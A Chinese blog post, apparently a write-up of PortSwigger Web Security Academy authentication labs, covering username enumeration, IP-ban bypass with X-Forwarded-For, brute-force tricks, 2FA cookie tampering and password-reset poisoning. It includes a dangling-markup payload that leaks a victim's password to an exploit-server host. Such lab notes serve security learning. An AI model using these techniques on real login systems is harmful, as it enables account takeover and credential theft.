@@ -1,0 +1,245 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Burpsuite靶场----身份认证专题 | Evylnk</title><meta name="author" content="Evylnk"><meta name="copyright" content="Evylnk"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Burp Intruder模块方法 其中里面的正则提取功能真的很强大很好用 Lab: Username enumeration via response timing通过登录成功与否页面响应的时间不同来判断  首先，尝试多次失败会被ban掉ip，这里我们可以构造XFF头来绕过，X-Forwarded-For: 3737  其次，如果用户名无效，则页面时间响应差不多，但是如果用户名是对的，页面响应时">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Burpsuite靶场----身份认证专题">
+<meta property="og:url" content="http://emion.fun/2022/03/06/burp_authentication/index.html">
+<meta property="og:site_name" content="Evylnk">
+<meta property="og:description" content="Burp Intruder模块方法 其中里面的正则提取功能真的很强大很好用 Lab: Username enumeration via response timing通过登录成功与否页面响应的时间不同来判断  首先，尝试多次失败会被ban掉ip，这里我们可以构造XFF头来绕过，X-Forwarded-For: 3737  其次，如果用户名无效，则页面时间响应差不多，但是如果用户名是对的，页面响应时">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008i3skNgy1gy092h2rcrj31410u045d.jpg">
+<meta property="article:published_time" content="2022-03-06T05:30:09.550Z">
+<meta property="article:modified_time" content="2022-03-09T12:57:57.609Z">
+<meta property="article:author" content="Evylnk">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tva1.sinaimg.cn/large/008i3skNgy1gy092h2rcrj31410u045d.jpg"><link rel="shortcut icon" href="/img/1.jpg"><link rel="canonical" href="http://emion.fun/2022/03/06/burp_authentication/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Burpsuite靶场----身份认证专题',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-03-09 20:57:57'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s3.bmp.ovh/imgs/2021/12/3a87cf2a04828f2b.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">17</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://tva1.sinaimg.cn/large/008i3skNgy1gy092h2rcrj31410u045d.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Evylnk</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Burpsuite靶场----身份认证专题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-03-06T05:30:09.550Z" title="发表于 2022-03-06 13:30:09">2022-03-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-03-09T12:57:57.609Z" title="更新于 2022-03-09 20:57:57">2022-03-09</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Burpsuite靶场----身份认证专题"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Burp-Intruder模块"><a href="#Burp-Intruder模块" class="headerlink" title="Burp Intruder模块"></a>Burp Intruder模块</h1><p><strong><a target="_blank" rel="noopener" href="https://jueee.github.io/2020/12/2020-12-27-Web%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7BurpSuite%E7%9A%84Intruder%E6%A8%A1%E5%9D%97/">方法</a></strong></p>
+<p><strong>其中里面的正则提取功能真的很强大很好用</strong></p>
+<h1 id="Lab-Username-enumeration-via-response-timing"><a href="#Lab-Username-enumeration-via-response-timing" class="headerlink" title="Lab: Username enumeration via response timing"></a>Lab: Username enumeration via response timing</h1><p><strong>通过登录成功与否页面响应的时间不同来判断</strong></p>
+<ul>
+<li>首先，尝试多次失败会被ban掉ip，这里我们可以构造XFF头来绕过，<code>X-Forwarded-For: 3737 </code></li>
+<li>其次，如果用户名无效，则页面时间响应差不多，但是如果用户名是对的，页面响应时间就会和密码长度有关，所以题目给了一个正确的用户名和密码，方便观察测试</li>
+<li>然后就是正常的爆破，用<code>pitchfork模式</code> – 每一个变量标记对应一个字典，一一对应进行破解。</li>
+</ul>
+<h1 id="Flawed-brute-force-protection"><a href="#Flawed-brute-force-protection" class="headerlink" title="Flawed brute-force protection"></a>Flawed brute-force protection</h1><p><strong>防止暴力破解最常见有效的两种方法就是</strong></p>
+<ul>
+<li><strong>如果尝试登录失败次数过多封锁ip</strong></li>
+<li><strong>如果尝试快速登录很多次阻止远程ip</strong></li>
+</ul>
+<p><strong>而这两种方法，都有缺陷，因为它会以登录成功来重置这个登录的计数器，比如这个实验允许登录三次，我们就可以在三次内成功一次就可以又有三次机会，而我们只需要一个已经知道的账户</strong></p>
+<p>所以我们可以构造这样的字典</p>
+<p>账户</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h0066z1m7uj20n40loq3m.jpg"></p>
+<p>密码</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h0067auonoj20ui0m2dgo.jpg"></p>
+<p><strong>奇数为我们需要爆破的密码，偶数则为已知的密码</strong></p>
+<p><strong>注意爆破的时候把线程调小，防止线程太大依然会导致登录过快</strong></p>
+<h2 id="Account-locking"><a href="#Account-locking" class="headerlink" title="Account locking"></a>Account locking</h2><p><strong>账户锁定，因为也是会将”该用户已锁定”之类的字样显示在响应包中的，所以也可以用于枚举用户名</strong></p>
+<ul>
+<li><strong>有一个用户名的字典，其中包括了有效的用户，随便一个密码，用burp爆破，每个账户都爆破设置的阙值次数，而有效的账户他返回的包长度比其他的大（因为有”该用户已锁定”类似的字样）</strong></li>
+<li><strong>然后就可以根据这个已知的用户名去爆破其密码</strong></li>
+</ul>
+<p><strong>因为有些人喜欢将不同网站密码设置成相同的，这就导致如果他们其中一个账户密码泄漏以后可以用来登录其他账户，并且因为只尝试一次而无法触发该防护手段</strong></p>
+<h1 id="Lab-Broken-brute-force-protection-multiple-credentials-per-request"><a href="#Lab-Broken-brute-force-protection-multiple-credentials-per-request" class="headerlink" title="Lab: Broken brute-force protection, multiple credentials per request"></a>Lab: Broken brute-force protection, multiple credentials per request</h1><p><strong>用户登录有频率限制</strong></p>
+<p><strong>可以将username和password组合成字典形式，以json格式发包一次发出去，让系统一个一个对比</strong></p>
+<p>这里放一个小脚本，转化下格式</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;./1.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">lines = file.readlines()</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;&quot;&#123;&#125;&quot;,&#x27;</span>.<span class="built_in">format</span>(line.strip()))</span><br><span class="line"></span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>
+
+<p><strong>别问，问就是Office那些还不太会用</strong></p>
+<h1 id="Lab-2FA-broken-logic"><a href="#Lab-2FA-broken-logic" class="headerlink" title="Lab: 2FA broken logic"></a>Lab: 2FA broken logic</h1><p>这个实验我tm爆破了五次，有时候参数传错了，有次忘记爆破完了，没去交答案。。。无语了</p>
+<p>主要利用方法就是因为，我们可以用自己的账户去登录，然后改验证用户时的那个user cookie，再去爆破用受害者用户发送的验证码</p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h01n1kqiy2j214t0u0q8i.jpg"></p>
+<p>真的好难等。。</p>
+<h1 id="重置密码"><a href="#重置密码" class="headerlink" title="重置密码"></a>重置密码</h1><h2 id="1-使用邮箱重置"><a href="#1-使用邮箱重置" class="headerlink" title="1.使用邮箱重置"></a>1.使用邮箱重置</h2><p><strong>如果将新密码直接发送给用户邮箱，这是很蠢的行为，很容易遭到中间人窃取，因为有些用户的信息会在多端同步，所以电子邮箱重置一般认为是不安全的</strong></p>
+<h2 id="2-使用URL重置"><a href="#2-使用URL重置" class="headerlink" title="2.使用URL重置"></a>2.使用URL重置</h2><p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h03u8oqivej21cg0q444m.jpg"></p>
+<p><strong>有些网站在提交重置密码表单，并不会验证token，所以hacker可以直接删除token验证，重置任意用户密码</strong></p>
+<h1 id="Lab-Password-reset-poisoning-via-middleware"><a href="#Lab-Password-reset-poisoning-via-middleware" class="headerlink" title="Lab: Password reset poisoning via middleware"></a>Lab: Password reset poisoning via middleware</h1><p><strong>这个实验，重置密码的token是动态生成发给邮箱，但是他会发给指定HOST字段的域名，所以我们可以利用<code>X-Forwarded-Host</code>来修改我们自己服务器的域名，可以接收到发给其他用户的重置密码的token</strong></p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h03ueds7ewj216b0u07bi.jpg"></p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h03ueshol7j21e401q3z3.jpg"></p>
+<p><strong>有了这个就可以重置受害者的密码，类似于XSS攻击的利用</strong></p>
+<h1 id="Lab-Password-brute-force-via-password-change"><a href="#Lab-Password-brute-force-via-password-change" class="headerlink" title="Lab: Password brute-force via password change"></a>Lab: Password brute-force via password change</h1><p><strong>有时候用户需要更改密码，而有些情况是，系统不强制要求只能更改当前登录用户的密码，然后根据某个参数名定位用户，因为输入错误当前密码和输入正确当前密码但是两次验证新密码错误，两者提示不一样，可以通过爆破来判断某个用户的旧密码</strong></p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h03vac1hzjj21ay0ooaes.jpg"></p>
+<h1 id="Lab-Password-reset-poisoning-via-dangling-markup"><a href="#Lab-Password-reset-poisoning-via-dangling-markup" class="headerlink" title="Lab: Password reset poisoning via dangling markup"></a>Lab: Password reset poisoning via dangling markup</h1><p><strong>这个主要是利用一个XSS点去打，得到发送到用户的邮件(因为之前那个评论的xss点被过滤了</strong></p>
+<p><strong>我们发现，虽然改了HOST服务器会返回错误，但是我们可以改任意端口，发现也是可以访问的<code>Host: ac231fcd1ebf78a2c0da32e500e90045.web-security-academy.net:6666</code>，然后我们可以查看到邮件有个<code>view raw</code>，发现这里的html并没有进行过滤，我们可以利用类似这样的payload去打<code>&quot;&gt;&lt;img src=&quot;//exploit-ac101fda1e5a7810c09632bf012200cf.web-security-academy.net/?</code>，这叫做<code>Dangling markup injection</code>在后面的xss攻击中会讲到</strong></p>
+<p><strong>之后就可以在自己服务器的log中查看到密码</strong></p>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h03xcm4541j21gq01iaaf.jpg"></p>
+<p><strong>这个专题就做完了，除了那个2FA的爆破。。。太慢了，我不配做</strong></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Evylnk</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://emion.fun/2022/03/06/burp_authentication/">http://emion.fun/2022/03/06/burp_authentication/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://emion.fun" target="_blank">Evylnk</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://tva1.sinaimg.cn/large/008i3skNgy1gy092h2rcrj31410u045d.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/03/02/burp_sql/"><img class="next-cover" src="https://tva1.sinaimg.cn/large/008i3skNgy1gy092h2rcrj31410u045d.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Burpsuite靶场----SQL注入专题</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s3.bmp.ovh/imgs/2021/12/3a87cf2a04828f2b.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Evylnk</div><div class="author-info__description">CTF && PWN && STUDENT</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">17</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/LHXHL"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/LHXHL" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">愿你有一个灿烂的前程，愿你有情人终成眷属，愿你在尘世中收获幸福。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Burp-Intruder%E6%A8%A1%E5%9D%97"><span class="toc-number">1.</span> <span class="toc-text">Burp Intruder模块</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lab-Username-enumeration-via-response-timing"><span class="toc-number">2.</span> <span class="toc-text">Lab: Username enumeration via response timing</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Flawed-brute-force-protection"><span class="toc-number">3.</span> <span class="toc-text">Flawed brute-force protection</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Account-locking"><span class="toc-number">3.1.</span> <span class="toc-text">Account locking</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lab-Broken-brute-force-protection-multiple-credentials-per-request"><span class="toc-number">4.</span> <span class="toc-text">Lab: Broken brute-force protection, multiple credentials per request</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lab-2FA-broken-logic"><span class="toc-number">5.</span> <span class="toc-text">Lab: 2FA broken logic</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81"><span class="toc-number">6.</span> <span class="toc-text">重置密码</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E4%BD%BF%E7%94%A8%E9%82%AE%E7%AE%B1%E9%87%8D%E7%BD%AE"><span class="toc-number">6.1.</span> <span class="toc-text">1.使用邮箱重置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E4%BD%BF%E7%94%A8URL%E9%87%8D%E7%BD%AE"><span class="toc-number">6.2.</span> <span class="toc-text">2.使用URL重置</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lab-Password-reset-poisoning-via-middleware"><span class="toc-number">7.</span> <span class="toc-text">Lab: Password reset poisoning via middleware</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lab-Password-brute-force-via-password-change"><span class="toc-number">8.</span> <span class="toc-text">Lab: Password brute-force via password change</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Lab-Password-reset-poisoning-via-dangling-markup"><span class="toc-number">9.</span> <span class="toc-text">Lab: Password reset poisoning via dangling markup</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/06/burp_authentication/" title="Burpsuite靶场----身份认证专题">Burpsuite靶场----身份认证专题</a><time datetime="2022-03-06T05:30:09.550Z" title="发表于 2022-03-06 13:30:09">2022-03-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/02/burp_sql/" title="Burpsuite靶场----SQL注入专题">Burpsuite靶场----SQL注入专题</a><time datetime="2022-03-02T12:36:45.594Z" title="发表于 2022-03-02 20:36:45">2022-03-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/02/26/tryme/" title="Introduction to Web Hacking">Introduction to Web Hacking</a><time datetime="2022-02-26T15:48:12.928Z" title="发表于 2022-02-26 23:48:12">2022-02-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/02/21/lpy3/" title="python_spider学习（三）">python_spider学习（三）</a><time datetime="2022-02-21T10:00:04.735Z" title="发表于 2022-02-21 18:00:04">2022-02-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/02/20/lpy2/" title="python_spider学习（二）">python_spider学习（二）</a><time datetime="2022-02-20T04:44:24.443Z" title="发表于 2022-02-20 12:44:24">2022-02-20</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://tva1.sinaimg.cn/large/008i3skNgy1gy092h2rcrj31410u045d.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2022 By Evylnk</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi,希望能够帮到你。</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
+  window.MathJax = {
+    tex: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]],
+      tags: 'ams'
+    },
+    chtml: {
+      scale: 1.2
+    },
+    options: {
+      renderActions: {
+        findScript: [10, doc => {
+          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+            const display = !!node.type.match(/; *mode=display/)
+            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+            const text = document.createTextNode('')
+            node.parentNode.replaceChild(text, node)
+            math.start = {node: text, delim: '', n: 0}
+            math.end = {node: text, delim: '', n: 0}
+            doc.math.push(math)
+          }
+        }, ''],
+        insertScript: [200, () => {
+          document.querySelectorAll('mjx-container:not\([display]\)').forEach(node => {
+            const target = node.parentNode
+            if (target.nodeName.toLowerCase() === 'li') {
+              target.parentNode.classList.add('has-jax')
+            } else {
+              target.classList.add('has-jax')
+            }
+          });
+        }, '', false]
+      }
+    }
+  }
+  
+  const script = document.createElement('script')
+  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
+  script.id = 'MathJax-script'
+  script.async = true
+  document.head.appendChild(script)
+} else {
+  MathJax.startup.document.state(0)
+  MathJax.texReset()
+  MathJax.typeset()
+}</script></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="true"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-heart.min.js" async="async" mobile="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
